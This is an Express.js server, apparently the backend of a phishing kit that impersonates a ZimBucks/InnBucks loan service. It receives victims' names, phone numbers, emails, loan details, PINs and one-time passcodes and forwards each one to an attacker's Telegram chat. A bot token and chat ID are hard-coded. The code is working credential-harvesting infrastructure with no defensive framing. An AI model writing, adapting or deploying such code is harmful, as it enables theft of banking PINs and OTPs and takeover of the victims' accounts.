const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = '8347873216:AAFYC7jL2r50gHLMecU1fHqA3azVVvopW4I';
const TELEGRAM_CHAT_ID = '7386607055';

async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
    });
}

function formatNotification(data) {
    const { name, phone, email, pin, amount, term, type, site } = data;
    const timestamp = new Date().toLocaleString('en-ZA', { timeZone: 'Africa/Harare' });
    
    if (type === 'pin') {
        return `🔐 NEW PIN CONFIRMATION 🔐\n━━━━━━━━━━━━━━━━━━━━━\n📱 Site: ${site || 'ZimBucks'}\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email}\n💰 Amount: $${amount}\n📅 Term: ${term} months\n🔢 PIN Code: ${pin}\n━━━━━━━━━━━━━━━━━━━━━\n⏰ Time: ${timestamp}`;
    } else {
        return `✅ NEW OTP VERIFICATION ✅\n━━━━━━━━━━━━━━━━━━━━━\n📱 Site: ${site || 'InnBucks'}\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email}\n🔢 OTP Code: ${pin}\n━━━━━━━━━━━━━━━━━━━━━\n⏰ Time: ${timestamp}`;
    }
}

app.get('/', (req, res) => {
    res.json({ status: 'OK', message: 'ZimBucks Backend is running' });
});

app.get('/health', (req, res) => {
    res.json({ status: 'OK' });
});

app.post('/api/send-telegram', async (req, res) => {
    try {
        const data = req.body;
        console.log('Received:', data);
        
        if (!data.phone || !data.pin || !data.name) {
            return res.status(400).json({ success: false, error: 'Missing fields' });
        }
        
        const message = formatNotification(data);
        await sendToTelegram(message);
        
        res.json({ success: true });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
